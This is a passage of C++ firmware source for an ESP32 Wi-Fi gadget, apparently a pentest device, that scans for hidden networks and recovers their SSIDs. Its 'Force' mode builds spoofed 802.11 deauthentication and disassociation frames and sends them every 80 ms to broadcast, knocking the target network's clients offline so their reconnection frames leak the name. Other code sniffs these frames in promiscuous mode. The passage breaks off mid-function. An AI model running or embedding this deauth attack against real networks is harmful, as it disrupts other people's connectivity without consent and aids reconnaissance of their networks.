static uint32_t s_mgmtFrames = 0;
static uint32_t s_ssidHits = 0;
static uint32_t s_deauthSent = 0;
static unsigned long s_listenStartedMs = 0;
static unsigned long s_lastStatusMs = 0;
static unsigned long s_lastHopMs = 0;
static unsigned long s_lastDeauthMs = 0;
static int s_hopPos = 0;
static bool s_listenAll = false;
static int s_lastRenderedIndex = -1;
static int s_lastRenderedPage = -1;
static bool s_revealUiDrawn = false;
static uint32_t s_lastDrawnDeauth = 0xFFFFFFFF;
static uint32_t s_lastDrawnMgmt = 0xFFFFFFFF;
static uint32_t s_lastDrawnHits = 0xFFFFFFFF;
static bool s_lastDrawnForcing = false;
static bool s_lastDrawnListening = false;
static bool s_lastDrawnHasName = false;

static constexpr unsigned long DEAUTH_INTERVAL_MS = 80;

static const uint8_t s_deauthTemplate[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x00, 0x00,
    0x07, 0x00
};
static uint8_t s_deauthFrame[26];

static volatile bool s_revealPending = false;
static volatile int s_revealIndex = -1;
static char s_pendingSsid[33] = {0};
static portMUX_TYPE s_revealMux = portMUX_INITIALIZER_UNLOCKED;

static void drawRevealScreen();
static void drawRevealScreen(bool fullRedraw);
static void updateRevealStats();
static void updateNavLabels(bool onRevealScreen);
static void startListening(bool withForce);
static void stopListening();
static void drawScanScreen();
static void drawScanScreen(bool fullRedraw);

static int networksPerPage() {
  return max(1, (wifiListBottomY() - LIST_FIRST_ROW_Y) / LIST_ROW_H);
}

static void updateNavLabels(bool onRevealScreen) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (onRevealScreen) {
    setTouchNavLabels("Back", nullptr, s_forcing ? "Stop" : "Force",
                      nullptr, s_listening ? nullptr : "Listen");
  } else {
    setTouchNavLabels("Back", "Next", "Reveal", "Prev", "Rescan");
  }
  redrawTouchButtonBar();
}

static int compareHiddenAp(const void* a, const void* b) {
  const HiddenAp* ap1 = (const HiddenAp*)a;
  const HiddenAp* ap2 = (const HiddenAp*)b;
  return (int)ap2->rssi - (int)ap1->rssi;
}

static bool parseSsidIe(const uint8_t* ie, int ieLen, char* out, size_t outSz) {
  if (!ie || ieLen < 2 || !out || outSz < 2) {
    return false;
  }
  int off = 0;
  while (off + 2 <= ieLen) {
    const uint8_t id = ie[off];
    const uint8_t len = ie[off + 1];
    if (off + 2 + len > ieLen) {
      break;
    }
    if (id == 0) {
      if (len == 0 || len > 32) {
        return false;
      }
      bool allZero = true;
      for (uint8_t i = 0; i < len; i++) {
        if (ie[off + 2 + i] != 0) {
          allZero = false;
          break;
        }
      }
      if (allZero) {
        return false;
      }
      const size_t n = min((size_t)len, outSz - 1);
      memcpy(out, &ie[off + 2], n);
      out[n] = '\0';
      return true;
    }
    off += 2 + len;
  }
  return false;
}

static int findApByBssid(const uint8_t* bssid) {
  if (!bssid) {
    return -1;
  }
  for (int i = 0; i < s_count; i++) {
    if (memcmp(s_aps[i].bssid, bssid, 6) == 0) {
      return i;
    }
  }
  return -1;
}

static void queueReveal(int index, const char* ssid) {
  if (index < 0 || index >= s_count || !ssid || !ssid[0]) {
    return;
  }
  if (s_aps[index].has_name && strcmp(s_aps[index].revealed, ssid) == 0) {
    return;
  }
  portENTER_CRITICAL(&s_revealMux);
  strncpy(s_pendingSsid, ssid, sizeof(s_pendingSsid) - 1);
  s_pendingSsid[sizeof(s_pendingSsid) - 1] = '\0';
  s_revealIndex = index;
  s_revealPending = true;
  portEXIT_CRITICAL(&s_revealMux);
}

static void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!feature_active || !s_listening || type != WIFI_PKT_MGMT) {
    return;
  }

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  if (!pkt || !pkt->payload) {
    return;
  }

  const uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  // ESP-IDF may include FCS in sig_len
  if (len > 4) {
    len -= 4;
  }
  if (len < 24) {
    return;
  }

  s_mgmtFrames++;

  const uint8_t frameCtl = p[0];
  if ((frameCtl & 0x0C) != 0x00) {
    return;  // not management
  }
  const uint8_t subtype = frameCtl & 0xF0;

  const uint8_t* bssid = nullptr;
  int ieOff = -1;

  switch (subtype) {
    case 0x50:  // Probe Response
      bssid = p + 16;
      ieOff = 24 + 12;
      break;
    case 0x00:  // Association Request
      bssid = p + 4;
      ieOff = 24 + 4;
      break;
    case 0x20:  // Reassociation Request
      bssid = p + 4;
      ieOff = 24 + 10;
      break;
    case 0x40: {  // Probe Request (directed only)
      const uint8_t* addr1 = p + 4;
      static const uint8_t kBcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      if (memcmp(addr1, kBcast, 6) != 0) {
        bssid = addr1;
      } else {
        const uint8_t* addr3 = p + 16;
        if (memcmp(addr3, kBcast, 6) != 0) {
          bssid = addr3;
        }
      }
      ieOff = 24;
      break;
    }
    default:
      return;
  }

  if (!bssid || ieOff < 0 || ieOff >= len) {
    return;
  }

  char ssid[33];
  if (!parseSsidIe(p + ieOff, len - ieOff, ssid, sizeof(ssid))) {
    return;
  }

  s_ssidHits++;
  const int idx = findApByBssid(bssid);
  if (idx >= 0) {
    if (!s_listenAll && s_selectedIndex >= 0 && idx != s_selectedIndex) {
      return;
    }
    queueReveal(idx, ssid);
  }
}

static void stopListening() {
  s_forcing = false;
  s_listening = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
}

static void sendForceDeauth(const uint8_t* bssid, uint8_t channel) {
  if (!bssid) {
    return;
  }
  if (channel < 1 || channel > 14) {
    channel = 1;
  }
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  // AP -> stations (broadcast)
  memcpy(s_deauthFrame, s_deauthTemplate, sizeof(s_deauthFrame));
  s_deauthFrame[0] = 0xC0;
  memset(&s_deauthFrame[4], 0xFF, 6);
  memcpy(&s_deauthFrame[10], bssid, 6);
  memcpy(&s_deauthFrame[16], bssid, 6);
  (void)esp_wifi_80211_tx(WIFI_IF_AP, s_deauthFrame, sizeof(s_deauthFrame), false);
  s_deauthSent++;

  // Stations -> AP
  memcpy(s_deauthFrame, s_deauthTemplate, sizeof(s_deauthFrame));
  s_deauthFrame[0] = 0xC0;
  memcpy(&s_deauthFrame[4], bssid, 6);
  memset(&s_deauthFrame[10], 0xFF, 6);
  memcpy(&s_deauthFrame[16], bssid, 6);
  (void)esp_wifi_80211_tx(WIFI_IF_AP, s_deauthFrame, sizeof(s_deauthFrame), false);
  s_deauthSent++;

  // Disassoc broadcast as well
  memcpy(s_deauthFrame, s_deauthTemplate, sizeof(s_deauthFrame));
  s_deauthFrame[0] = 0xA0;
  memset(&s_deauthFrame[4], 0xFF, 6);
  memcpy(&s_deauthFrame[10], bssid, 6);
  memcpy(&s_deauthFrame[16], bssid, 6);
  (void)esp_wifi_80211_tx(WIFI_IF_AP, s_deauthFrame, sizeof(s_deauthFrame), false);
  s_deauthSent++;
}

static void startListening(bool withForce) {
  if (s_count <= 0) {
    return;
  }

  uint8_t ch = 1;
  if (s_listenAll) {
    s_hopPos = 0;
    ch = s_aps[0].channel;
  } else if (s_selectedIndex >= 0 && s_selectedIndex < s_count) {
    ch = s_aps[s_selectedIndex].channel;
  }
  if (ch < 1 || ch > 14) {
    ch = 1;
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);

  // SoftAP gives us WIFI_IF_AP for raw deauth TX while promiscuous sniffs rejoins.
  WiFi.mode(WIFI_AP);
  delay(30);
  wifi_config_t ap_config = {};
  strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
  ap_config.ap.ssid_len = 9;
  ap_config.ap.password[0] = '\0';
  ap_config.ap.authmode = WIFI_AUTH_OPEN;
  ap_config.ap.ssid_hidden = 1;
  ap_config.ap.max_connection = 4;
  ap_config.ap.beacon_interval = 100;
  ap_config.ap.channel = ch;
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  esp_wifi_start();
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_promiscuous(true);

  s_listening = true;
  s_forcing = withForce;
  s_mgmtFrames = 0;
  s_ssidHits = 0;
  if (withForce) {
    s_deauthSent = 0;
  }
  s_listenStartedMs = millis();
  s_lastHopMs = millis();
  s_lastDeauthMs = 0;
  s_lastStatusMs = 0;
}

static void toggleForce() {
  if (s_forcing) {
    s_forcing = false;
    updateRevealStats();
    updateNavLabels(true);
    return;
  }
  if (!s_listening) {
    startListening(true);
  } else {
    s_forcing = true;
    s_deauthSent = 0;
    s_lastDeauthMs = 0;
  }
  updateRevealStats();
  updateNavLabels(true);
}

static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                           : FeatureUI::ButtonStyle::Secondary;
  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

static void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton,
                       bool prevDisabled, const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    updateNavLabels(s_selectedIndex >= 0 || s_listenAll);
    return;
  }

  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
  if (leftButton && leftButton[0]) {
    drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
  }
  if (prevButton && prevButton[0]) {
    drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  }
  if (nextButton && nextButton[0]) {
    drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
  }
}

static void drawApRow(int i, int y, bool isSel) {
  char buf[64];
  char name[16];
  if (s_aps[i].has_name && s_aps[i].revealed[0]) {
    strncpy(name, s_aps[i].revealed, 11);
    name[11] = '\0';
    if (strlen(s_aps[i].revealed) > 11) {
      strcat(name, "...");
    }
  } else {
    snprintf(name, sizeof(name), "%02X%02X%02X%02X",
             s_aps[i].bssid[2], s_aps[i].bssid[3],
             s_aps[i].bssid[4], s_aps[i].bssid[5]);
  }

  const char* tag = s_aps[i].has_name ? "OK" : "??";
  snprintf(buf, sizeof(buf), "%02d: %-14s %3d Ch%2d %s",
           i + 1, name, s_aps[i].rssi, s_aps[i].channel, tag);

  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
  tft.setCursor(2, y);
  tft.setTextColor(isSel ? ORANGE : FEATURE_BG);
  tft.print(isSel ? ">" : " ");
  tft.setCursor(10, y);
  tft.setTextColor(isSel ? ORANGE : (s_aps[i].has_name ? GREEN : WHITE));
  tft.println(buf);
}

static void drawScanScreen(bool fullRedraw) {
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  tft.setTextSize(1);

  if (s_scanning) {
    wifiClearBody(TFT_BLACK);
    s_lastRenderedIndex = -1;
    s_lastRenderedPage = -1;
    tft.setCursor(10, 50);
    tft.setTextColor(GREEN);
    tft.println("Scanning.");
    loading(100, ORANGE, 0, 0, 3, true);
    tft.setCursor(10, 65);
    tft.println("Finding hidden SSIDs.");
    return;
  }

  if (s_count == 0) {
    wifiClearBody(TFT_BLACK);
    s_lastRenderedIndex = -1;
    s_lastRenderedPage = -1;
    tft.setTextColor(GREEN);
    tft.setCursor(10, 50);
    tft.println("No hidden SSIDs found.");
    tft.setCursor(10, 65);
    tft.println("Press Rescan.");
    drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  const int perPage = networksPerPage();
  if (s_currentIndex < 0) {
    s_currentIndex = 0;
  }
  if (s_currentIndex >= s_count) {
    s_currentIndex = max(0, s_count - 1);
  }
  s_currentPage = s_currentIndex / max(1, perPage);

  const bool pageChanged = (s_currentPage != s_lastRenderedPage);
  const bool needFull = fullRedraw || pageChanged || (s_lastRenderedIndex < 0);

  if (!needFull && s_lastRenderedIndex != s_currentIndex) {
    const int prev = s_lastRenderedIndex;
    const int now = s_currentIndex;
    if (prev >= s_currentPage * perPage && prev < s_currentPage * perPage + perPage) {
      const int row = prev - s_currentPage * perPage;
      drawApRow(prev, LIST_FIRST_ROW_Y + row * LIST_ROW_H, false);
    }
    if (now >= s_currentPage * perPage && now < s_currentPage * perPage + perPage) {
      const int row = now - s_currentPage * perPage;
      drawApRow(now, LIST_FIRST_ROW_Y + row * LIST_ROW_H, true);
    }
    s_lastRenderedIndex = s_currentIndex;
    return;
  }

  if (!needFull) {
    return;
  }

  wifiClearBody(TFT_BLACK);
  s_revealUiDrawn = false;

  tft.setTextColor(GREEN);
  tft.setCursor(10, LIST_HEADER_Y);
  tft.println("Hidden SSIDs:");

  char page_buf[20];
  snprintf(page_buf, sizeof(page_buf), "Page %d/%d",
           s_currentPage + 1, max(1, (s_count + perPage - 1) / perPage));
  tft.setCursor(180, LIST_HEADER_Y);
  tft.setTextColor(GREEN);
  tft.println(page_buf);

  int y = LIST_FIRST_ROW_Y;
  const int start_index = s_currentPage * perPage;
  const int end_index = min(start_index + perPage, s_count);
  for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
    drawApRow(i, y, i == s_currentIndex);
    y += LIST_ROW_H;
  }

  drawTabBar("Rescan", false, "Prev", s_currentIndex <= 0, "Next",
             s_currentIndex >= s_count - 1);
  s_lastRenderedIndex = s_currentIndex;
  s_lastRenderedPage = s_currentPage;
}

static void drawScanScreen() {
  drawScanScreen(true);
}

static void fillRevealLine(int y, const char* text, uint16_t color) {
  tft.fillRect(0, y, SCREEN_WIDTH, 12, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(10, y);
  tft.print(text);
}

static void updateRevealStats() {
  if (!s_revealUiDrawn) {
    drawRevealScreen(true);
    return;
  }

  const HiddenAp* ap = nullptr;
  if (!s_listenAll && s_selectedIndex >= 0 && s_selectedIndex < s_count) {
    ap = &s_aps[s_selectedIndex];
  }

  char buf[64];
  const bool statusChanged =
      (s_lastDrawnForcing != s_forcing) || (s_lastDrawnListening != s_listening);
  if (statusChanged) {
    if (s_forcing) {
      fillRevealLine(90, "Status: Forcing reveal", ORANGE);
    } else if (s_listening) {
      fillRevealLine(90, "Status: Listening", ORANGE);
    } else {
      fillRevealLine(90, "Status: Stopped", UI_DIM_TEXT);
    }
    s_lastDrawnForcing = s_forcing;
    s_lastDrawnListening = s_listening;

    if (s_forcing) {
      fillRevealLine(200, "Force: deauth clients so they", UI_DIM_TEXT);
      fillRevealLine(214, "reassociate and leak SSID.", UI_DIM_TEXT);
    } else {
      fillRevealLine(200, "Force kicks clients to elicit", UI_DIM_TEXT);
      fillRevealLine(214, "assoc/probe frames with SSID.", UI_DIM_TEXT);
    }
  }

  if (s_lastDrawnDeauth != s_deauthSent) {
    snprintf(buf, sizeof(buf), "Deauth TX: %u", s_deauthSent);
    fillRevealLine(110, buf, WHITE);
    s_lastDrawnDeauth = s_deauthSent;
  }

  if (s_lastDrawnMgmt != s_mgmtFrames || s_lastDrawnHits != s_ssidHits) {
    snprintf(buf, sizeof(buf), "Mgmt RX: %u  SSID IE: %u", s_mgmtFrames, s_ssidHits);
    fillRevealLine(125, buf, WHITE);
    s_lastDrawnMgmt = s_mgmtFrames;
    s_lastDrawnHits = s_ssidHits;
  }

  const bool hasName = ap && ap->has_name;
  if (hasName != s_lastDrawnHasName) {
    tft.fillRect(0, 168, SCREEN_WIDTH, 14, TFT_BLACK);
    tft.setCursor(10, 168);
    if (ap && ap->has_name) {
      tft.setTextColor(ORANGE, TFT_BLACK);
      tft.print(ap->revealed);
    } else if (s_listenAll) {
      int revealed = 0;
      for (int i = 0; i < s_count; i++) {
        if (s_aps[i].has_name) {
          revealed++;
        }
      }
      tft.setTextColor(ORANGE, TFT_BLACK);
      snprintf(buf, sizeof(buf), "%d / %d recovered", revealed, s_count);
      tft.print(buf);
    } else {
      tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
      tft.print("(waiting for rejoin...)");
    }
    s_lastDrawnHasName = hasName;
  }
}

static void drawRevealScreen(bool fullRedraw) {
  if (!fullRedraw && s_revealUiDrawn) {
    updateRevealStats();
    return;
  }

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  wifiClearBody(TFT_BLACK);
  tft.setTextSize(1);
  s_lastRenderedIndex = -1;
  s_lastRenderedPage = -1;

  char buf[64];
  const HiddenAp* ap = nullptr;
  if (!s_listenAll && s_selectedIndex >= 0 && s_selectedIndex < s_count) {
    ap = &s_aps[s_selectedIndex];
  }

  tft.setTextColor(WHITE);
  tft.setCursor(10, 50);
  if (s_listenAll) {
    tft.println("Target: All hidden APs");
  } else if (ap) {
    snprintf(buf, sizeof(buf), "Target: %02X:%02X:%02X:%02X:%02X:%02X",
             ap->bssid[0], ap->bssid[1], ap->bssid[2],
             ap->bssid[3], ap->bssid[4], ap->bssid[5]);
    tft.println(buf);
  }

  tft.setCursor(10, 70);
  if (ap) {
    snprintf(buf, sizeof(buf), "Channel: %u   RSSI: %d", ap->channel, ap->rssi);
  } else {
    snprintf(buf, sizeof(buf), "Hidden APs: %d", s_count);
  }
  tft.println(buf);

  if (s_forcing) {
    fillRevealLine(90, "Status: Forcing reveal", ORANGE);
  } else if (s_listening) {
    fillRevealLine(90, "Status: Listening", ORANGE);
  } else {
    fillRevealLine(90, "Status: Stopped", UI_DIM_TEXT);
  }

  snprintf(buf, sizeof(buf), "Deauth TX: %u", s_deauthSent);
  fillRevealLine(110, buf, WHITE);
  snprintf(buf, sizeof(buf), "Mgmt RX: %u  SSID IE: %u", s_mgmtFrames, s_ssidHits);
  fillRevealLine(125, buf, WHITE);

  tft.setTextColor(GREEN, TFT_BLACK);
  tft.setCursor(10, 150);
  tft.print("Revealed SSID:");

  tft.fillRect(0, 168, SCREEN_WIDTH, 14, TFT_BLACK);
  tft.setCursor(10, 168);
  if (ap && ap->has_name) {
    tft.setTextColor(ORANGE, TFT_BLACK);
    tft.println(ap->revealed);
  } else if (s_listenAll) {
    int revealed = 0;
    for (int i = 0; i < s_count; i++) {
      if (s_aps[i].has_name) {
        revealed++;
      }
    }
    tft.setTextColor(ORANGE, TFT_BLACK);
    snprintf(buf, sizeof(buf), "%d / %d recovered", revealed, s_count);
    tft.println(buf);
  } else {
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.println("(waiting for rejoin...)");
  }

  if (s_forcing) {
    fillRevealLine(200, "Force: deauth clients so they", UI_DIM_TEXT);
    fillRevealLine(214, "reassociate and leak SSID.", UI_DIM_TEXT);
  } else {
    fillRevealLine(200, "Force kicks clients to elicit", UI_DIM_TEXT);
    fillRevealLine(214, "assoc/probe frames with SSID.", UI_DIM_TEXT);
  }

  s_revealUiDrawn = true;
  s_lastDrawnDeauth = s_deauthSent;
  s_lastDrawnMgmt = s_mgmtFrames;
  s_lastDrawnHits = s_ssidHits;
  s_lastDrawnForcing = s_forcing;
  s_lastDrawnListening = s_listening;
  s_lastDrawnHasName = ap && ap->has_name;

  const char* buttons[] = {s_forcing ? "Stop" : "Force", "Back"};
  drawTabBar(buttons[0], false, "", true, buttons[1], false);
}

static void drawRevealScreen() {
  drawRevealScreen(true);
}

static bool scanHiddenNetworks() {
  stopListening();
  s_scanning = true;
  s_selectedIndex = -1;
  s_listenAll = false;
  s_currentPage = 0;
  s_currentIndex = 0;
  s_lastRenderedIndex = -1;
  s_lastRenderedPage = -1;
  s_revealUiDrawn = false;
  drawScanScreen(true);

  // Preserve previously revealed names across rescans.
  HiddenAp prev[MAX_HIDDEN_APS];
  const int prevCount = min(s_count, MAX_HIDDEN_APS);
  if (prevCount > 0) {
    memcpy(prev, s_aps, prevCount * sizeof(HiddenAp));
  }

  const int n = WifiScan::staWifiScanSync();
  s_count = 0;
  if (n <= 0) {
    s_scanning = false;
    return false;
  }

  for (int i = 0; i < n && s_count < MAX_HIDDEN_APS; i++) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() > 0) {
      continue;
    }
    const uint8_t* bssid = WiFi.BSSID(i);
    if (!bssid) {
      continue;
    }

    HiddenAp& ap = s_aps[s_count];
    memset(&ap, 0, sizeof(ap));
    memcpy(ap.bssid, bssid, 6);
    ap.rssi = WiFi.RSSI(i);
    ap.channel = WiFi.channel(i);
    ap.authmode = WiFi.encryptionType(i);
    ap.has_name = false;
    ap.revealed[0] = '\0';

    for (int j = 0; j < prevCount; j++) {
      if (memcmp(prev[j].bssid, ap.bssid, 6) == 0 && prev[j].has_name) {
        strncpy(ap.revealed, prev[j].revealed, sizeof(ap.revealed) - 1);
        ap.has_name = true;
        break;
      }
    }
    s_count++;
  }

  if (s_count > 1) {
    qsort(s_aps, s_count, sizeof(HiddenAp), compareHiddenAp);
  }

  s_scanning = false;
  return s_count > 0;
}

static void openRevealTarget(int index, bool all) {
  if (!all && (index < 0 || index >= s_count)) {
    return;
  }
  s_listenAll = all;
  s_selectedIndex = all ? -1 : index;
  if (!all) {
    s_currentIndex = index;
  }

  // Paint first so selection feels instant, then bring radio up.
  s_listening = false;
  s_forcing = true;
  s_mgmtFrames = 0;
  s_ssidHits = 0;
  s_deauthSent = 0;
  drawRevealScreen(true);
  updateNavLabels(true);
  startListening(true);
  updateRevealStats();
}

static void flushPendingReveal() {
  if (!s_revealPending) {
    return;
  }

  char ssid[33];
  int index = -1;
  portENTER_CRITICAL(&s_revealMux);
  s_revealPending = false;
  index = s_revealIndex;
  strncpy(ssid, s_pendingSsid, sizeof(ssid) - 1);
  ssid[sizeof(ssid) - 1] = '\0';
  portEXIT_CRITICAL(&s_revealMux);

  if (index < 0 || index >= s_count || !ssid[0]) {
    return;
  }

  strncpy(s_aps[index].revealed, ssid, sizeof(s_aps[index].revealed) - 1);
  s_aps[index].revealed[sizeof(s_aps[index].revealed) - 1] = '\0';
  s_aps[index].has_name = true;
  s_forcing = false;
  updateRevealStats();
  updateNavLabels(true);
}

static void handleNavButtons() {
  const unsigned long now = millis();
  if (now - s_lastBtnMs < BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    (void)isButtonPressedEdge(BTN_SELECT);
    return;
  }

  const bool onReveal = (s_selectedIndex >= 0 || s_listenAll);

  if (onReveal) {
    if (isButtonPressedEdge(BTN_LEFT)) {
      stopListening();
      s_selectedIndex = -1;
      s_listenAll = false;
      s_revealUiDrawn = false;
      drawScanScreen(true);
      updateNavLabels(false);
      s_lastBtnMs = now;
      return;
    }
    if (isButtonPressedEdge(BTN_RIGHT) && !s_listening) {
      startListening(false);
      updateRevealStats();
      updateNavLabels(true);
      s_lastBtnMs = now;
      return;
    }
    if (isButtonPressedEdge(BTN_SELECT)) {
      toggleForce();
      s_lastBtnMs = now;
      return;
    }
    return;
  }

  if (s_scanning) {
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    feature_exit_requested = true;
    return;
  }
  if (isButtonPressedEdge(BTN_UP) && s_currentIndex > 0) {
    s_currentIndex--;
    drawScanScreen(false);
    s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN) && s_currentIndex < s_count - 1) {
    s_currentIndex++;
    drawScanScreen(false);
    s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    scanHiddenNetworks();
    drawScanScreen(true);
    s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_SELECT) && s_count > 0) {
    openRevealTarget(s_currentIndex, false);
    s_lastBtnMs = now;
  }
}

static void handleTouch() {
  int x, y;
  if (!readTouchXY(x, y)) {
    return;
  }

  static unsigned long lastTouchActionMs = 0;
  const unsigned long now = millis();
  if (now - lastTouchActionMs < 300) {
    return;
  }

  const bool onReveal = (s_selectedIndex >= 0 || s_listenAll);
  bool redraw = false;

  if (!onReveal) {
    const int listMaxY = LIST_FIRST_ROW_Y + (networksPerPage() * LIST_ROW_H);
    if (!s_scanning && y >= LIST_FIRST_ROW_Y && y < listMaxY && s_count > 0) {
      int index = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H + (s_currentPage * networksPerPage());
      if (index >= 0 && index < s_count) {
        openRevealTarget(index, false);
        lastTouchActionMs = now;
      }
    } else if (!featureHasTouchNavBar() && !s_scanning && y >= 290 && y <= 320) {
      if (x >= 0 && x <= 57) {
        drawButton(0, 304, 57, 16, "Rescan", true, false);
        scanHiddenNetworks();
        drawScanScreen();
        lastTouchActionMs = now;
        redraw = true;
      } else if (x >= 122 && x <= 179 && s_currentIndex > 0) {
        drawButton(117, 304, 57, 16, "Prev", true, false);
        s_currentIndex--;
        drawScanScreen(false);
        lastTouchActionMs = now;
        redraw = true;
      } else if (x >= 183 && x <= 240 && s_currentIndex < s_count - 1) {
        drawButton(178, 304, 57, 16, "Next", true, false);
        s_currentIndex++;
        drawScanScreen(false);
        lastTouchActionMs = now;
        redraw = true;
      }
    }
  } else {
    if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
      if (x >= 0 && x <= 57) {
        drawButton(0, 304, 57, 16, s_forcing ? "Stop" : "Force", true, false);
        toggleForce();
        lastTouchActionMs = now;
        redraw = true;
      } else if (x >= 183 && x <= 240) {
        drawButton(177, 304, 57, 16, "Back", true, false);
        stopListening();
        s_selectedIndex = -1;
        s_listenAll = false;
        s_revealUiDrawn = false;
        drawScanScreen(true);
        updateNavLabels(false);
        lastTouchActionMs = now;
        redraw = true;
      }
    }
  }

  if (redraw) {
    delay(50);
  }
}

static void runUI() {
  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;
  static const unsigned char* icons[ICON_NUM] = {
      bitmap_icon_undo,
      bitmap_icon_go_back};

  if (!s_uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    s_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  switch (animationState) {
    case 0:
      break;
    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;
    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;
    case 3:
      if (activeIcon == 0) {
        stopListening();
        s_selectedIndex = -1;
        s_listenAll = false;
        s_revealUiDrawn = false;
        scanHiddenNetworks();
        drawScanScreen(true);
        updateNavLabels(false);
      }
      animationState = 0;
      activeIcon = -1;
      break;
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 1) {
                feature_exit_requested = true;
              } else {
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

static void hopChannelsIfNeeded() {
  if (!s_listening || !s_listenAll || s_count <= 1) {
    return;
  }
  if (millis() - s_lastHopMs < LISTEN_HOP_MS) {
    return;
  }
  s_lastHopMs = millis();
  s_hopPos = (s_hopPos + 1) % s_count;
  uint8_t ch = s_aps[s_hopPos].channel;
  if (ch < 1 || ch > 14) {
    ch = 1;
  }
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

static void teardown() {
  stopListening();
  WiFi.scanDelete();
  WiFi.disconnect(true, true);
  s_selectedIndex = -1;
  s_listenAll = false;
  s_scanning = false;
  s_revealPending = false;
}

void hiddenSsidSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  updateNavLabels(false);
  featureClearContent(TFT_BLACK);

  setupTouchscreen();
  s_uiDrawn = false;
  s_count = 0;
  s_currentIndex = 0;
  s_currentPage = 0;
  s_selectedIndex = -1;
  s_listenAll = false;
  s_listening = false;
  s_forcing = false;
  s_scanning = false;
  s_mgmtFrames = 0;
  s_ssidHits = 0;
  s_deauthSent = 0;
  s_revealPending = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();
  runUI();

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  tft.setTextColor(GREEN, BLACK);
  tft.setTextSize(1);
  tft.setCursor(10, 50);
  tft.println("Initializing...");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);

  scanHiddenNetworks();
  drawScanScreen();
  redrawTouchButtonBar();
}

void hiddenSsidLoop() {
  if (feature_exit_requested) {
    teardown();
    return;
  }

  tft.drawFastHLine(0, 19, 240, UI_LINE);

  handleNavButtons();
  handleTouch();
  flushPendingReveal();
